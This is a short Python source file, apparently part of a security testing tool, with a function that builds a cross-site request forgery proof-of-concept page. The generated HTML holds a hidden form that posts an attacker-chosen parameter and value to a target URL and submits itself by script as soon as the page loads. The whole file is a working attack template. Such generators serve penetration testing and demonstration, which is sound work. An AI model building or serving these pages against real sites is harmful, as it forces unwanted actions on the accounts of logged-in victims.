from base_module import BaseModule

def generate_csrf_poc(vulnerable_url, attack_parameter, attack_value):
  poc_html = f"""
  <html>
  <body>
    <h1>CSRF attack</h1>
    <p>If you are logged in to the target application, this page will attempt to modify your information.</p>
    <form action="{vulnerable_url}" method="POST">
      <input type="hidden" name="{attack_parameter}" value="{attack_value}">
      <input type="submit" value="Soumettre">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
  </html>
  """
  return poc_html
